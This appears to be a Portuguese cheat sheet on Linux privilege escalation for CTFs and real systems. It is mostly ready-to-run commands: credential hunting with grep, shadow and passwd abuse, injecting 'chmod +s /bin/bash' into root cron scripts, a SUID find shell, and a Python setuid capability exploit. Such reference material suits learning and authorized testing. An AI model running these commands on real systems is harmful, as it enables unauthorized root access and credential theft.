# Linux Privilege Escalation - Cheat Sheet

Guia rápido para técnicas de escalonamento de privilégios em sistemas Linux, focado em enumeração manual e exploração de vetores comuns encontrados em CTFs e ambientes reais.

---

## 1. Enumeração de Sistema & Ambiente

O primeiro passo é entender onde você está e o que o usuário atual andou fazendo.

* **Informações do Sistema:**
    ```bash
    uname -a                # Kernel, arquitetura e versão do SO
    cat /etc/os-release     # Detalhes da distribuição
    ```
* **Histórico de Comandos:**
    ```bash
    cat ~/.bash_history     # Pode conter senhas digitadas ou caminhos de arquivos sensíveis
    ```
* **Serviços Internos:**
    Identificar serviços rodando apenas localmente (podem ser vetores de escalonamento).
    ```bash
    ss -tlnp                # Lista portas e serviços ativos
    ```

---

## 2. Busca de Arquivos e Segredos

Utilize o `find` e o `grep` para localizar arquivos de configuração, backups ou credenciais expostas.

### Comando `find`
Busca eficiente de arquivos específicos ou padrões:
```bash
# Busca por nome ignorando maiúsculas/minúsculas
find / -name "*flag*" -type f 2>/dev/null

# Busca por extensões sensíveis (.env, .conf, .bak)
find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -type f 2>/dev/null

# Filtrar por diretório específico (ex: /opt)
find /opt -name "config.txt" -type f
```
---

### Comando `grep`
Busca de strings (senhas/tokens) dentro de arquivos de log ou configurações:
```bash
# Buscar palavras-chave no diretório de logs de forma recursiva
grep -iEr "password|token|secret|cred" /var/log/ 2>/dev/null

# Analisar logs de acesso web por padrões específicos
grep -iE "robots|token|password|secret|cred" access.log
```

---

## 3. Permissões de Arquivos e Credenciais
Entender as permissões Linux (rwx) é fundamental para identificar falhas de segurança.
 * Arquivos Críticos: Verifique se arquivos sensíveis têm permissões de leitura/escrita indevidas.
 ```bash
    ls -la /etc/shadow      # Se tiver leitura, você pode tentar crackear os hashes
    ls -la /etc/passwd      # Se tiver escrita, você pode criar um usuário root
 ```
 * Movimentação Lateral: Muitas vezes, senhas encontradas em arquivos de configuração (.env, .bak) são reutilizadas pelo usuário de sistema ou pelo root.
  ```bash
    su <usuario>            # Tente trocar de usuário com as senhas encontradas
  ```

## 4. Agendamento de Tarefas (Cron Jobs)
Tarefas que rodam automaticamente como root são vetores críticos.

 * Análise do Crontab:
 ```bash
 cat /etc/crontab
 ```
 * **Vetor de Ataque:** Se um script executado pelo cron for editável pelo seu usuário, você pode injetar comandos para ganhar shell de root ou alterar permissões.
    * **Exemplo de Injeção:** `echo "chmod +s /bin/bash" >> /caminho/do/script.sh`

## 5. Binários SUID (Set User ID)
Arquivos com o bit SUID permitem que um usuário execute o arquivo com os privilégios do dono (geralmente root).

 * **Encontrar binários SUID:** `find / -perm -u+s -type f 2>/dev/null`\
 * **Exploração via GTFOBins:** Se encontrar um binário incomum ou um utilitário conhecido (como find, cp, vim), consulte o GTFOBins para comandos de exploração.
    * **Exemplo (se o find tiver SUID):** `./find . -exec /bin/sh -p \; -quit`

## 6. Linux Capabilities
Capabilities dividem os privilégios do root em pequenos pedaços, permitindo que binários executem funções específicas sem serem totalmente "root".

 * **Listar Capabilities de arquivos:** `getcap -r / 2>/dev/null`
 * **Exemplo de exploração (Python):**: `python3 -c "import os; os.setuid(0); os.execl('/bin/bash', '/bin/sh')"`

## 7. Dicas de Pós-Exploração
 * **Melhorar a Shell (Upgrade TTY):** `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 * **Verificar SUDO:** `sudo -l     # Lista o que o seu usuário pode rodar como sudo`